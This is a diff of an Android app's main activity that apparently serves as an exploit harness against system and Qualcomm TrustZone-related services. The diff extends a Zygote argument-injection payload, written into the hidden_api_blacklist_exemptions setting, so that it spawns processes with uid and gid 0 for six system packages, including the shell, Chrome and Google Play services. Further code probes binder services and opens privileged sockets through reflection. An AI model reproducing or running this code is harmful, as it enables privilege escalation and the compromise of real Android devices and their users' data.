@@ -5,8 +5,6 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.ServiceConnection;
 import android.content.pm.PackageManager;
-import android.net.LocalSocket;
-import android.net.LocalSocketAddress;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Environment;
@@ -17,7 +15,6 @@ import android.os.Parcel;
 import android.os.ParcelFileDescriptor;
 import android.os.RemoteException;
 import android.provider.Settings;
-import android.util.Log;
 import android.view.View;
 import android.widget.Button;
 import android.widget.ScrollView;
@@ -33,10 +30,9 @@ import com.qualcomm.qti.qms.connectionsecuritysdk.ITlocService;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
-import java.io.InputStream;
-import java.io.OutputStream;
 import java.io.OutputStreamWriter;
 import java.io.PrintWriter;
+import java.lang.reflect.Method;
 import java.nio.charset.StandardCharsets;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
@@ -68,9 +64,7 @@ public class MainActivity extends AppCompatActivity {
         public void onServiceConnected(ComponentName name, IBinder service) {
             mServiceManager = IServiceManager.Stub.asInterface(service);
             appendLog("CS Service bound");
-            if (mTZServiceBinder != null) {
-                startTests();
-            }
+            if (mTZServiceBinder != null) startTests();
         }
         @Override
         public void onServiceDisconnected(ComponentName name) {
@@ -86,9 +80,7 @@ public class MainActivity extends AppCompatActivity {
         public void onServiceConnected(ComponentName name, IBinder service) {
             mTZServiceBinder = service;
             appendLog("TZ Service bound");
-            if (mServiceManager != null) {
-                startTests();
-            }
+            if (mServiceManager != null) startTests();
         }
         @Override
         public void onServiceDisconnected(ComponentName name) {
@@ -188,7 +180,7 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void executeFullTest() {
-        appendLog("========== CS Service Enumeration ==========");
+        appendLog("========== PHASE 1: CS Service Enumeration ==========");
         if (mServiceManager != null) {
             IBinder rticBinder = getService("rtic");
             if (rticBinder != null) {
@@ -204,19 +196,19 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
-        appendLog("========== Zygote Injection via WRITE_SECURE_SETTINGS ==========");
+        appendLog("========== PHASE 2: Zygote Injection via WRITE_SECURE_SETTINGS ==========");
         testZygoteInjection();
 
-        appendLog("========== TZAccess: Connect to minksocket ==========");
+        appendLog("========== PHASE 3: TZAccess Socket Connect ==========");
         if (mTZServiceBinder != null) {
             tryConnectViaTZ("/dev/socket/minksocket");
             tryConnectViaTZ("/dev/socket/ssgqmig");
         }
 
-        appendLog("========== File Read/Write ==========");
+        appendLog("========== PHASE 4: File Read/Write ==========");
         testFileReadWrite();
 
-        appendLog("========== Settings Manipulation ==========");
+        appendLog("========== PHASE 5: Settings Manipulation ==========");
         testSettingsWrite();
 
         appendLog("========== ALL TESTS COMPLETED ==========");
@@ -298,46 +290,44 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void testZygoteInjection() {
-        appendLog("--- Attempting Zygote injection via hidden_api_blacklist_exemptions ---");
-        try {
-            String current = Settings.Global.getString(getContentResolver(), "hidden_api_blacklist_exemptions");
-            appendLog("Current value: " + current);
+        appendLog("--- Zygote injection via hidden_api_blacklist_exemptions ---");
+        String[] targets = {
+            "com.android.shell",
+            "com.android.systemui",
+            "com.android.settings",
+            "com.android.chrome",
+            "com.android.vending",
+            "com.google.android.gms"
+        };
+        for (String pkg : targets) {
+            if (stopRequested.get()) break;
+            appendLog("Trying package: " + pkg);
+            try {
+                String current = Settings.Global.getString(getContentResolver(), "hidden_api_blacklist_exemptions");
+                StringBuilder payload = new StringBuilder();
+                for (int i = 0; i < 8000; i++) payload.append('A');
+                payload.append("9\n");
+                payload.append("--runtime-args\n");
+                payload.append("--setuid=0\n");
+                payload.append("--setgid=0\n");
+                payload.append("--target-sdk-version=29\n");
+                payload.append("--nice-name=root_" + pkg.replace(".", "_") + "\n");
+                payload.append("--app-data-dir=/data/data/" + pkg + "\n");
+                payload.append("--package-name=" + pkg + "\n");
+                payload.append("android.app.ActivityThread\n");
+                payload.append(",,,X");
 
-            // ペイロード: パディング + スパウンコマンド (com.android.shell を root で起動)
-            StringBuilder payload = new StringBuilder();
-            // パディング約8000バイト
-            for (int i = 0; i < 8000; i++) payload.append('A');
-            // spawn コマンド (9 引数)
-            payload.append("9\n");
-            payload.append("--runtime-args\n");
-            payload.append("--setuid=0\n");
-            payload.append("--setgid=0\n");
-            payload.append("--target-sdk-version=29\n");
-            payload.append("--nice-name=root_shell\n");
-            payload.append("--app-data-dir=/data/data/com.android.shell\n");
-            payload.append("--package-name=com.android.shell\n");
-            payload.append("android.app.ActivityThread\n");
-            // 遅延エントリ
-            payload.append(",,,X");
-
-            String malicious = payload.toString();
-            appendLog("Setting malicious value (length=" + malicious.length() + ")");
-            boolean success = Settings.Global.putString(getContentResolver(), "hidden_api_blacklist_exemptions", malicious);
-            if (success) {
-                appendLog("Setting updated. Triggering Zygote...");
-                // ポリシーをトグルして更新を促進
+                String malicious = payload.toString();
+                Settings.Global.putString(getContentResolver(), "hidden_api_blacklist_exemptions", malicious);
                 String oldPolicy = Settings.Global.getString(getContentResolver(), "hidden_api_policy");
                 Settings.Global.putString(getContentResolver(), "hidden_api_policy", "1");
                 Settings.Global.putString(getContentResolver(), "hidden_api_policy", oldPolicy != null ? oldPolicy : "");
-                appendLog("Triggered. Check for root_shell process.");
-                // 元に戻す
                 Settings.Global.putString(getContentResolver(), "hidden_api_blacklist_exemptions", current);
-                appendLog("Restored original setting.");
-            } else {
-                appendLog("Failed to set setting (permission denied?)");
+                appendLog("  Injected for " + pkg + " (restored)");
+                Thread.sleep(500);
+            } catch (Exception e) {
+                appendLog("  Error for " + pkg + ": " + e.getMessage());
             }
-        } catch (Exception e) {
-            appendLog("Zygote injection error: " + e.getMessage());
         }
     }
 
@@ -348,22 +338,15 @@ public class MainActivity extends AppCompatActivity {
             return;
         }
         try {
-            int[] iArr = new int[1];
-            ParcelFileDescriptor pfd = (ParcelFileDescriptor) mTZServiceBinder.transact(1, Parcel.obtain(), Parcel.obtain(), 0);
-            // Actually we need to use the AIDL interface, but we don't have it bound.
-            // Instead, we can use the service via reflection? Since we have the AIDL, we can use the interface.
-            // We'll try to get the IMinkSocketFd from the binder.
-            // But we have not imported it. We'll use the known AIDL class.
-            // Since we have it in the project, we can use it.
-            // Let's use reflection to get the service.
             Class<?> cls = Class.forName("com.qualcomm.qti.qms.api.minksocket.IMinkSocketFd");
             Method asInterface = cls.getMethod("asInterface", IBinder.class);
             Object proxy = asInterface.invoke(null, mTZServiceBinder);
             Method aMethod = cls.getMethod("a", String.class, int[].class);
-            ParcelFileDescriptor pfd2 = (ParcelFileDescriptor) aMethod.invoke(proxy, path, iArr);
-            if (pfd2 != null) {
+            int[] iArr = new int[1];
+            ParcelFileDescriptor pfd = (ParcelFileDescriptor) aMethod.invoke(proxy, path, iArr);
+            if (pfd != null) {
                 appendLog("  Got FD: " + iArr[0] + " for " + path);
-                pfd2.close();
+                pfd.close();
             } else {
                 appendLog("  Failed to get FD for " + path);
             }
@@ -383,7 +366,6 @@ public class MainActivity extends AppCompatActivity {
             } catch (Exception e) {
                 appendLog("Write failed: " + e.getMessage());
             }
-            // 読み取り試行 /proc/self/status
             try {
                 File status = new File("/proc/self/status");
                 if (status.exists()) {
